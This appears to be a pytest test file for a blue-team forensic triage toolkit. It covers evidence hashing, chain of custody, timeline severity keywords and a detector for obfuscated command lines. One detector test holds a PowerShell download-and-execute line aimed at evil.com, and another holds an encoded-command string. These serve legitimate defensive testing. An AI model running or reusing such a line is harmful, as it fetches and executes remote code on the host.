"""
Tests for GIDEON LANTERN — DFIR Triage Toolkit
"""
import json
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from blueteam.acquisition import evidence_handler as eh
from blueteam.timeline    import timeline_builder as tb
from blueteam.artifacts   import correlator       as corr


# ── evidence_handler ──────────────────────────────────────────────────────────

class TestEvidenceDetectType:
    def test_disk_dd(self, tmp_path):
        f = tmp_path / "disk.dd"
        f.write_bytes(b"\x00" * 16)
        assert eh._detect_type(f) == "disk"

    def test_memory_dmp(self, tmp_path):
        f = tmp_path / "mem.dmp"
        f.write_bytes(b"\x00" * 16)
        assert eh._detect_type(f) == "memory"

    def test_pcap_extension(self, tmp_path):
        f = tmp_path / "capture.pcap"
        f.write_bytes(b"\x00" * 16)
        assert eh._detect_type(f) == "pcap"

    def test_raw_pcap_magic(self, tmp_path):
        # .raw with PCAP little-endian magic → pcap
        f = tmp_path / "capture.raw"
        f.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 12)
        assert eh._detect_type(f) == "pcap"

    def test_raw_elf_magic(self, tmp_path):
        # .raw with ELF magic → memory
        f = tmp_path / "mem.raw"
        f.write_bytes(b"\x7f\x45\x4c\x46" + b"\x00" * 12)
        assert eh._detect_type(f) == "memory"

    def test_raw_default_disk(self, tmp_path):
        # .raw with no known magic → defaults to disk
        f = tmp_path / "image.raw"
        f.write_bytes(b"\x00" * 16)
        assert eh._detect_type(f) == "disk"

    def test_unknown_extension(self, tmp_path):
        f = tmp_path / "file.xyz"
        f.write_bytes(b"\x00" * 16)
        assert eh._detect_type(f) == "unknown"


class TestHashFile:
    def test_sha256_known(self, tmp_path):
        import hashlib
        f = tmp_path / "test.bin"
        data = b"hello world"
        f.write_bytes(data)
        hashes = eh._hash_file(f, 65536)
        assert hashes["sha256"] == hashlib.sha256(data).hexdigest()
        assert hashes["md5"]    == hashlib.md5(data).hexdigest()
        assert hashes["sha1"]   == hashlib.sha1(data).hexdigest()

    def test_empty_file(self, tmp_path):
        import hashlib
        f = tmp_path / "empty.bin"
        f.write_bytes(b"")
        hashes = eh._hash_file(f, 65536)
        assert hashes["sha256"] == hashlib.sha256(b"").hexdigest()


class TestInitialiseCase:
    def test_creates_subdirectories(self, tmp_path):
        ctx = eh.initialise_case("Test Case", "Analyst", tmp_path)
        case_dir = Path(ctx.case_dir)
        for sub in ("artifacts", "disk", "memory", "network",
                    "timeline", "iocs", "yara", "reports", "logs"):
            assert (case_dir / sub).is_dir(), f"Missing: {sub}"

    def test_case_context_fields(self, tmp_path):
        ctx = eh.initialise_case("IR-2024-001", "J.Smith", tmp_path)
        assert ctx.case_name == "IR-2024-001"
        assert ctx.examiner  == "J.Smith"
        assert len(ctx.chain_of_custody) == 1
        assert ctx.chain_of_custody[0].action == "CASE_OPENED"


class TestIngestEvidence:
    def test_hashes_populated(self, tmp_path):
        img = tmp_path / "disk.dd"
        img.write_bytes(b"\x00" * 1024)
        ctx = eh.initialise_case("test", "analyst", tmp_path)
        eh.ingest_evidence(ctx, [img])
        assert len(ctx.evidence) == 1
        ev = ctx.evidence[0]
        assert len(ev.sha256) == 64
        assert len(ev.md5) == 32

    def test_missing_file_skipped(self, tmp_path):
        ctx = eh.initialise_case("test", "analyst", tmp_path)
        eh.ingest_evidence(ctx, [tmp_path / "nonexistent.dd"])
        assert len(ctx.evidence) == 0

    def test_coc_entry_created(self, tmp_path):
        img = tmp_path / "disk.dd"
        img.write_bytes(b"\x00" * 16)
        ctx = eh.initialise_case("test", "analyst", tmp_path)
        eh.ingest_evidence(ctx, [img])
        actions = [e.action for e in ctx.chain_of_custody]
        assert "EVIDENCE_INGESTED" in actions


class TestVerifyIntegrity:
    def test_passes_on_unchanged_file(self, tmp_path):
        import stat as stat_mod
        img = tmp_path / "disk.dd"
        img.write_bytes(b"\xAB" * 512)
        ctx = eh.initialise_case("test", "analyst", tmp_path)
        eh.ingest_evidence(ctx, [img])
        # Re-enable write so we can re-hash (integrity check reads only)
        img.chmod(img.stat().st_mode | stat_mod.S_IWRITE)
        assert eh.verify_integrity(ctx) is True

    def test_fails_on_tampered_file(self, tmp_path):
        import stat as stat_mod
        img = tmp_path / "disk.dd"
        img.write_bytes(b"\xAB" * 512)
        ctx = eh.initialise_case("test", "analyst", tmp_path)
        eh.ingest_evidence(ctx, [img])
        # Re-enable write then tamper
        img.chmod(img.stat().st_mode | stat_mod.S_IWRITE)
        img.write_bytes(b"\xCD" * 512)
        assert eh.verify_integrity(ctx) is False


# ── timeline_builder ──────────────────────────────────────────────────────────

class TestNormaliseTimestamp:
    def test_iso_format(self):
        ts = tb._normalise_timestamp("2024-01-15T10:30:00+00:00")
        assert "2024" in ts

    def test_fallback_on_invalid(self):
        ts = tb._normalise_timestamp("not-a-date")
        assert ts == "not-a-date"

    def test_none_returns_current(self):
        ts = tb._normalise_timestamp("")
        assert "T" in ts  # ISO-8601


class TestClassifySeverity:
    def test_critical_keyword(self):
        assert tb._classify_severity("mimikatz credential dump") == "critical"

    def test_high_keyword(self):
        assert tb._classify_severity("scheduled task persistence") == "high"

    def test_info_default(self):
        assert tb._classify_severity("benign boring event") == "info"


# ── correlator ────────────────────────────────────────────────────────────────

class TestValidExternalIp:
    def test_public_ip(self):
        assert corr._valid_external_ip("8.8.8.8") is True

    def test_private_10(self):
        assert corr._valid_external_ip("10.0.0.1") is False

    def test_private_192(self):
        assert corr._valid_external_ip("192.168.1.1") is False

    def test_invalid_octet(self):
        assert corr._valid_external_ip("999.0.0.1") is False

    def test_empty_string(self):
        assert corr._valid_external_ip("") is False


class TestCorrelateEmpty:
    def test_no_findings_returns_empty(self):
        result = corr.correlate(None, None, None)
        assert result == []


class TestDetectObfuscatedCmdlines:
    def test_encoded_command(self):
        cmds = ["powershell -EncodedCommand dGVzdA=="]
        assert len(corr._detect_obfuscated_cmdlines(cmds)) == 1

    def test_iex(self):
        cmds = ["IEX(New-Object Net.WebClient).DownloadString('http://evil.com')"]
        assert len(corr._detect_obfuscated_cmdlines(cmds)) == 1

    def test_clean_command(self):
        cmds = ["cmd.exe /c dir C:\\"]
        assert corr._detect_obfuscated_cmdlines(cmds) == []
